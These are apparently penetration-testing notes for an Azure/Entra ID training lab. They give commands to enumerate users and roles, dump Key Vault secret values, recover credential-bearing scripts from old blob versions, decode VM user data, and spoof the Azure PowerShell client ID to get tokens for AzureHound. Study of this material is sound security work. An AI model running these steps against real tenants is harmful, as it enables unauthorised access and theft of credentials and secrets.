Install requirements:
```
Install-Module -Name Az
Import-Module -Name Az

Install-Module Microsoft.Graph
Import-Module Microsoft.Graph.Users
```

Login and `whoami`:
```bash
# PowerShell AND Bash
az login --use-device-code
	To sign in, use a web browser to open the page https://login.microsoft.com/device and enter the code ES6QHV5UX to authenticate.
az ad signed-in-user show
az account show

Connect-MgGraph -UseDeviceAuthentication
Get-MgContext

Connect-AzAccount -UseDeviceAuthentication
```

Logout:
```bash
az logout
Disconnect-AzAccount
Disconnect-MgGraph
```

Get `SubscriptionID`:
```bash
az account show --query id --output tsv
```

Get Group Membership for the user:
```PowerShell
Get-MgUserMemberOf -userid "name@domain.com" | select * -ExpandProperty additionalProperties | Select-Object {$_.AdditionalProperties["displayName"]}
```

Set of commands to enumerate Entra ID:
```PowerShell
# Given subscription ID
$CurrentSubscriptionID = "XXXXX-XXX-XXX-XXX-XXXXXXXXXXXX"
# Set output format
$OutputFormat = "table"
# Set the given subscription as the active one
& az account set --subscription $CurrentSubscriptionID
# List resources in the current subscription
& az resource list -o $OutputFormat
```

Set of commands to list Secrets and Keys inside the `THIS A VAULT` vault from PowerShell:
```PowerShell
# Set variables
$VaultName = "THIS A VAULT"
# Set the current Azure subscription
$SubscriptionID = "XXXXX-XXX-XXX-XXX-XXXXXXXXXXXX"
az account set --subscription $SubscriptionID
# List and store the secrets
$secretsJson = az keyvault secret list --vault-name $VaultName -o json
$secrets = $secretsJson | ConvertFrom-Json
# List and store the keys
$keysJson = az keyvault key list --vault-name $VaultName -o json
$keys = $keysJson | ConvertFrom-Json
# Output the secrets
Write-Host "Secrets in vault $VaultName"
foreach ($secret in $secrets) {
    Write-Host $secret.id
}
# Output the keys
Write-Host "Keys in vault $VaultName"
foreach ($key in $keys) {
    Write-Host $key.id
}
```

To list the contents of the Secrets in the `THIS A VAULT` vault from PowerShell:
```PowerShell
# Set variables
$VaultName = "THIS A VAULT"
$SecretNames = @("USER1", "USER2", "USER3")

# Set the current Azure subscription
$SubscriptionID = "XXXXX-XXX-XXX-XXX-XXXXXXXXXXXX"
az account set --subscription $SubscriptionID

# Retrieve and output the secret values
Write-Host "Secret Values from vault $VaultName"
foreach ($SecretName in $SecretNames) {
    $secretValueJson = az keyvault secret show --name $SecretName --vault-name $VaultName -o json
    $secretValue = ($secretValueJson | ConvertFrom-Json).value
    Write-Host "$SecretName - $secretValue"
}
```

Match the usernames to Entra ID users:
```bash
az ad user list --query "[?givenName=='FIRSTNAME1' || givenName=='FIRSTNAME2' || givenName=='FIRSTNAME3'].{Name:displayName, UPN:userPrincipalName, JobTitle:jobTitle}" -o table
	FIRSTNAME1
```

Continue to enumerate FIRSTNAME1 from OTHER users' access:
```PowerShell
Get-MgUser -UserId ext.FIRSTNAME1.LAST@domain.com
```

Get Membership of the Object Id:
```PowerShell
$UserId = 'XXXXX-XXX-XXX-XXX-XXXXXXXXXXXX'
Get-MgUserMemberOf -userid $userid | select * -ExpandProperty additionalProperties | Select-Object {$_.AdditionalProperties["displayName"]}
```

Enumerate the permissions assigned to the group objectID:
```PowerShell
Get-AzRoleAssignment -Scope "/subscriptions/XXXXX-XXX-XXX-XXX-XXXXXXXXXXXX" | Select-Object DisplayName, RoleDefinitionName

# OR

az role assignment list --scope "/subscriptions/XXXXX-XXX-XXX-XXX-XXXXXXXXXXXX" --output json
```

Get user's Role Assignments:
```PowerShell
Get-AzRoleAssignment -Scope "/subscriptions/XXXXX-XXX-XXX-XXX-XXXXXXXXXXXX" | Select-Object DisplayName, RoleDefinitionName

az role definition list --custom-role-only true --query "[?roleName=='Customer Database Access']" -o json
```

List the storage accounts in the account:
```bash
az storage account list --query "[].name" -o tsv
```

See if any storage tables exist in the `STORAGE`:

```bash
az storage table list --account-name STORAGE --output table --auth-mode login
```

Query the storage table:

```bash
az storage entity query --table-name TABLE --account-name STORAGE --output table --auth-mode login
```

To get all Entra ID users, open a PowerShell terminal and install the Microsoft Graph module with the command `Install-Module Microsoft.Graph` :

```PowerShell
# Connect to Microsoft Graph
Connect-MgGraph -UseDeviceAuthentication

# Retrieve all users
$allUsers = Get-MgUser -All

# Loop through all users and retrieve their custom security attributes
foreach ($user in $allUsers) {
    $userAttributes = Get-MgUser -UserId $user.Id -Property "customSecurityAttributes"
    
    # Display the additional properties of custom security attributes for each user
    Write-Host "User: $($user.UserPrincipalName)"
    $userAttributes.CustomSecurityAttributes.AdditionalProperties | Format-List
    Write-Host "---------------------------------------------"
}
```

Get `Azure role assignments` and authenticate with `Connect-AzAccount`.

```PowerShell
Connect-AzAccount
Get-AzRoleAssignment
```

Get `config-latest.xml` from container:

```bash
# Credentials: User: <USER> | Password: <PASSWORD>
az storage blob download --account-name ACCOUNT --container-name CONTAINER --name config-latest.xml --auth-mode login
```

We could also get the VM `User data `this way from CLI:

```PowerShell
Install-Module -Name Az -Repository PSGallery -Force
Connect-AzAccount
Get-AzVM -ResourceGroupName "content-static-2" -Name "ACCOUNT" -UserData
	UserData : <BASE64>
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<BASE64>"))
```
---
### Blob example: `https://mbtwebsite.blob.core.windows.net/$web/...`

`mbtwebsite` = name of the Azure Storage Account associated with the website
`blob.core.windows.net` = Azure Blob Storage Service
`$web` = name of the container hosting the web, and it is situated within the storage account

Working in linux, we use `pwsh` and and `iwr` enumerate the blob storage :
- Ensure PowerShell and Azure CLI are installed

```PowerShell
Invoke-WebRequest -Uri 'https://mbtwebsite.blob.core.windows.net/$web/index.html' -Method Head
```

Expand the headers using `Select-Object` as they were truncated in the output:

```bash
Invoke-WebRequest -Uri 'https://mbtwebsite.blob.core.windows.net/$web/index.html' -Method Head | Select-Object -ExpandProperty Headers
	x-ms-blob-type: BlockBlob
	Server: Windows-Azure-Blob

# Or on Linux
curl -I https://mbtwebsite.blob.core.windows.net/$web/index.html
```

Explore `$web` more and navigate in a browser to `https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list`

Return all blobs in a XML document:
`https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list`

Return just directories in the container, specify a delimiter: 
`https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&delimiter=%2F`

List previous blob versions:
`https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&include=versions`
- the `versions` parameter is only supported by version `2019-12-12` and later.
- specify version of the operation by setting `x-ms-version` and rerun:
```bash
apt install libxml2-utils
curl -H "x-ms-version: 2019-12-12" 'https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&include=versions' | xmllint --format - | less
	<Name>scripts-transfer.zip</Name>
	<VersionId>2025-08-07T21:08:03.6678148Z</VersionId>
```

We see the blob `scripts-transfer.zip` and the version ID that allows us to download it:

```bash
curl -H "x-ms-version: 2019-12-12" 'https://mbtwebsite.blob.core.windows.net/$web/scripts-transfer.zip?versionId=2025-08-07T21:08:03.6678148Z' --output scripts-transfer.zip
```

Unzipping, we find two scripts. Both contain credentials! Running these scripts we get an error and must install the `MSAL.PS` module first:

```PowerShell
./entra_users.ps1
	Import-Module MSAL.PS Error

Install-Module -Name MSAL.PS

./entra_users.ps1
	To sign in, use a web browser to open the page https://login.microsoft.com/device and enter the code BWNFVTVC7 to authenticate.

# Open Browser > navigate to https://login.microsoft.com/device and enter code > Enter email and password from `entra_users.ps1` > Continue > Return to Terminal for Entra Users output (Azure AD)
```

To get `whoami`, run following commands:

```PowerShell
Install-Module -Name Az
Import-Module -Name Az
Connect-AzAccount
Get-AzADUser -SignedIn | fl
```

---
# AzureHound
### **Install Docker and Docker Compose**
1. **Update your system**:
```bash
sudo apt update && sudo apt upgrade
```
2. **Install Docker**:
```bash
sudo apt install docker.io
```
3. **Enable Docker**:
```bash
sudo systemctl enable docker --now
```
4. **Install Docker Compose**:
```bash
sudo apt install docker-compose
```

### **Run BloodHound**

Once Docker and Docker Compose are installed, download and launch BloodHound CE:
```bash
curl -L https://ghst.ly/getbhce -o bloodhound.yml
sudo docker-compose -f bloodhound.yml up
```

This command sets up everything for you, and with BloodHound CE we no longer have to configure Neo4j. Pay attention to the terminal for the auto-generated password, which you'll use for the default `admin` user

We can also use `grep` to easily find the password.
```bash
docker logs $(docker ps --filter "name=bloodhound" -q) 2>&1 | grep "Initial Password Set To:"
```

---

Access bloodhound `http://localhost:8080/ui/login` go to `Download Collectors` and download `AzureHound`

Get the target Azure Entra ID by querying the OpenID configuration document and providing the name of the target domain in the URL:

```bash
apt install jq
curl -L login.microsoftonline.com/megabigtech.com/.well-known/openid-configuration | jq
{
	  "token_endpoint": "https://login.microsoftonline.com/XXXXXX-XXXX-XXX-XXXX-XXXXXXXXXXX/oauth2/token",
...
```

1st suggested PowerShell commands from [AzureHound](https://bloodhound.specterops.io/collect-data/ce-collection/azurehound#dealing-with-multi-factor-auth-and-conditional-access-policies) obtains tokens for AzureHound collector by spoofing the Azure PowerShell clientID and request tokens for the Microsoft Graph API. Run `pwsh` and then:

```PowerShell
$body = @{
    "client_id" =     "1950a258-227b-4e31-a9cf-717495945fc2"
    "resource" =      "https://graph.microsoft.com"
}
$UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
$Headers=@{}
$Headers["User-Agent"] = $UserAgent
$authResponse = Invoke-RestMethod `
    -UseBasicParsing `
    -Method Post `
    -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
    -Headers $Headers `
    -Body $body
$authResponse
```

Go to the link and enter the device code. Sign in with the assumed creds.

Now, run the 2nd suggested PowerShell commands from the AzureHound documentation. These commands obtains new tokens:

```PowerShell
$body=@{
   "client_id" =  "1950a258-227b-4e31-a9cf-717495945fc2"
   "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
   "code" =       $authResponse.device_code
}
$Tokens = Invoke-RestMethod `
   -UseBasicParsing `
   -Method Post `
   -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" `
   -Headers $Headers `
   -Body $body
$Tokens
```

If you get an error, run 1st commands then 2nd commands right after user is authenticated with device code.

Using the Refresh Token in the newly saved `$Tokens.refresh_token` variable, the AzureHound binary can be used with the `list` argument to collect all Azure Tenant data:

```PowerShell
./azurehound -r $Tokens.refresh_token list --tenant "XXXXXX-XXXX-XXX-XXXX-XXXXXXXXXXX" -o output.json
```

Ingest `output.json` into BloodHound. Search for `Jose` add him to owned. Enumerate his permissions and the full list of Azure edges is available in the official BloodHound [documentation](https://bloodhound.specterops.io/resources/edges/overview) .